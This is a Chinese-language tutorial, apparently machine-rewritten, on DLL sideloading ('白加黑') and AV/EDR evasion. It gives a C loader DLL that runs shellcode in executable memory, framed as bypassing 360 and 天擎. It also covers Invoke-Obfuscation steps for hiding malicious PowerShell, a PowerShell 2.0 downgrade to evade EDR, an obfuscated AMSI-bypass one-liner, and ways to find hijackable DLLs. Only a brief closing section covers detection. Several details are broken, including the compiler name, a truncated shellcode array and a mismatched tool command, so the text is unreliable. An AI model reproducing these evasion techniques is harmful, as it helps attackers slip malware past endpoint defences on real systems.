### 优化后的文本

#### 劫持 DllMain 控制流
在某些情况下，攻击者可能会劫持 `DllMain` 函数中的控制流。执行此操作时，并不需要枚举和满足所有必需的导出函数。实际上，可能存在一种情况，即 DLL 没有任何导出函数，仅通过 `DllMain` 入口点被劫持。

##### 白执行 DLL 加载 Shellcode
我们也可以通过构造恶意的黑 DLL 并在其中运行 shellcode 来实现命令执行，从而绕过 360 和天擎等安全软件的检测。

**黑 DLL 加载 Shellcode 的代码示例：**

```c
/*
DLL 执行 DLL 的命令
编译 64 位（Linux）：i686_64-w64-mingw32-gcc -shared -o xxx.dll xxx.c
*/
#include <windows.h>
#include <stdio.h>
#include <string.h>

// 加载的 shellcode（弹 calc） 64-bit
unsigned char payload[] = { 
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9 
};

extern "C" __declspec(dllexport) void Go(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    unsigned int payload_len = sizeof(payload);
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec_mem, payload, payload_len);
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            break;
    }
    return TRUE;
}
```

#### 无文件落地
##### 内存（ASMI）/行为（EDR）检测
一旦启用 PowerShell，就会触发微软 Defender 调用 ASMI 接口进行检测。需要注意的是，在启动 PowerShell 时，asmi.exe 已经被注入到 powershell.exe 进程中，因此 Defender 可以通过 ASMI 函数检测恶意行为。然而，由于某些原因，Powershell 无文件落地免杀在国内并不流行，因为 360 和天擎等安全软件会拦截一些敏感函数的调用，导致执行失败。不过，这种方法可以绕过火绒等杀软。

###### PowerShell 混淆
`Invoke-Obfuscation` 是一个兼容 PowerShell v2.0+ 的 PowerShell 命令和脚本混淆器（GitHub 地址：[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)）。

1. **创建并保存恶意 PowerShell 脚本**：
   ```powershell
   # 创建并保存恶意 PowerShell 脚本
   ```

2. **打开混淆工具并导入模块**：
   ```powershell
   Import-Module .\Invoke-Obfuscation.psd1
   Invoke-Obfuscation
   ```

3. **指定脚本路径并选择混淆方法**：
   ```powershell
   set scriptpath xxxx.ps1
   token
   all
   ```

4. **输出混淆后的脚本**：
   ```powershell
   out xxx.ps1
   ```

通过上述步骤，我们可以成功混淆恶意 PowerShell 脚本并逃避 AV 检测。建议有能力的开发者进行二次开发，去除加密特征值，以提高免杀效果。

**注意**：目标系统应能够执行 PowerShell 脚本，否则无法执行混淆或编码的 PowerShell 脚本。

###### 绕过 EDR
为了防止被 EDR 发现，可以通过将 PowerShell 降级到 2.0 版本来绕过 ConstrainedLanguage 模式。虽然效果不错，但如果 EDR 对版本进行标记，仍然可能导致异常。

```powershell
$ExecutionContext.SessionState.LanguageMode
PowerShell
$ExecutionContext.SessionState.LanguageMode
PowerShell -version 2
```

**提示**：Win10 及以上版本可能需要安装 PowerShell 2 版本才能利用该方法。

##### ASMI 免杀处理
为了做好 PowerShell 的免杀，可以采取以下内存规避手段：

- **专注于内存操作**，不将文件写入磁盘。
- **利用各种 Windows API 将有效负载注入进程**。
- **在存储器中的单独线程中执行有效载荷**。

但是，ASMI 仍然对 PowerShell 的免杀有致命打击，因此需要针对 PowerShell 的 ASMI 免杀进行特定研究。

###### 利用常见方法绕过
- **使用 XOR 等加密方法** 来绕过 AMSI，并在运行时将字符串解码回内存。
- **阻断 AMSI.dll 中的 AmsiScanBuffer() 函数**。
- **修改注册表**，将 `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable` 的值更改为 0。

###### 利用网站混淆绕过
```powershell
# Matt Graebers second Reflection method 
$wfSi=$null;$hlrajhy="$([char](30+53)+[cHaR]([byte]0x79)+[CHar]([BYtE]0x73)+[ChAR]([BYTe]0x74)+[Char](101*20/20)+[chaR](109*46/46)).$([CHaR](65+12)+[chAR](97+89-89)+[CHAR]([byTE]0x6e)+[cHAR]([bYte]0x61)+[char]([ByTe]0x67)+[ChAR](101)+[CHAR]([byTe]0x6d)+[cHaR]([bytE]0x65)+[cHar](116)).$(('Ãutômát'+'íón').NOrmAlizE([chaR](33+37)+[cHAR](111)+[ChAR]([BYTE]0x72)+[CHAr](109+28-28)+[CHar](68)) -replace [chaR](92+71-71)+[cHar]([BYTe]0x70)+[ChAr]([Byte]0x7b)+[ChaR]([BYtE]0x4d)+[chaR]([BYtE]0x6e)+[ChaR](125+53-53)).$(('Âms'+'íUt'+'íls').NORMaLIze([cHAr](70)+[cHAR]([BYTE]0x6f)+[cHAr](24+90)+[chAR](22+87)+[cHar](68+36-36)) -replace [cHAR]([bYTe]0x5c)+[Char](112+50-50)+[chAr]([bYtE]0x7b)+[CHar](77)+[cHAr]([byTE]0x6e)+[CHar]([BYTe]0x7d))";$xrgohuphpvm="+('n'+'u'+'ã').NormALize([CHaR](70+47-47)+[ChaR](111)+[cHaR]([BYtE]0x72)+[cHAR]([ByTe]0x6d)+[CHAR](68*53/53)) -replace [CHAr]([BYTE]0x5c)+[chAr]([bYte]0x70)+[ChAr]([BYTe]0x7b)+[chaR](77)+[cHaR](110+87-87)+[chAR](125*25/25)";[Threading.Thread]::Sleep(1085);[Runtime.InteropServices.Marshal]::"$([cHAR]([ByTe]0x57)+[char](114)+[Char]([byte]0x69)+[ChAR](116)+[chAR]([byte]0x65)+[ChAR](73+49-49)+[chAr](110+78-78)+[chAR]([BYte]0x74)+[CHar]([BYTE]0x33)+[cHAR](50*13/13))"([Ref].Assembly.GetType($hlrajhy).GetField("$(('àmsìC'+'ôntex'+'t').norMAlizE([CHAR]([BYte]0x46)+[ChAr]([BYtE]0x6f)+[Char](114+75-75)+[CHAr]([ByTE]0x6d)+[CHaR]([byTE]0x44)) -replace [CHar]([BYtE]0x5c)+[cHar](112+67-67)+[CHaR](123+7-7)+[CHar]([BYTE]0x4d)+[ChAR]([byTe]0x6e)+[ChAR]([bYtE]0x7d))",[Reflection.BindingFlags]"NonPublic,Static").GetValue($wfSi),0x5762f72c);
```

**网站链接**：[Matt Graeber's Blog](https://www.exploit-monday.com/)

#### 寻找白文件
##### 人工寻找白文件
通过 Procmon 进程监视器显示实时文件系统、注册表和进程/线程活动，我们可以观察进程运行过程中的 DLL 调用。通过设置不同的筛选方式来寻找可以加载的黑 DLL。

- **运行白文件对比**：寻找是否存在 `LoadLibrary` 函数，如果存在，可以直接构造一个恶意黑 DLL。
- **劫持不存在的 DLL**：如果不存在 `LoadLibrary` 函数，则需要劫持不存在的 DLL。

##### 自动化挖掘白文件
**DLLSpy.exe** 命令行选项：
- `-x`：强制扫描加载的模块。
- `-o`：指定输出文件。
- `-s`：静态扫描，寻找缺失的 DLL 和二进制文件中的 DLL。
- `-r`：递归扫描，`number` 是递归的深度。

**执行命令**：
```bash
python DllJacking_Python.py 目标文件夹地址
```

虽然高效，但误报率高，准确度低。也可以去相关网站搜索（网站地址：[DLLSpy](https://github.com/hfiref0x/DLLSpy)）。

#### 检测和预防措施
我也收集了一些关于“白加黑”攻击的预防和检测方法，并分享如下。这些方法包括软件开发级别的预防措施和端点用户级别的建议。

- **检查具有异常网络连接的进程**：如果给定进程的网络活动与基线不同，则该进程可能已受到损害。
- **限制 DLL 权限**：针对具有 `LoadLibrary()` 函数的 DLL 进行限制。
- **DLL 白名单**：跟踪系统上使用的 DLL 的哈希值以识别差异。

尽管这些检测方法难以大范围实施且成本高昂，但“白加黑”攻击仍然有效并在攻防演练中广泛使用。该恶意攻击方式的根本问题与软件开发人员密切相关。希望本文能被更多开发人员看到，以减少攻击者利用这种手段进行攻击的机会。

**参考文章**：
- [Black Basta Ransomware](https://www.black-basta-ransomware.com/)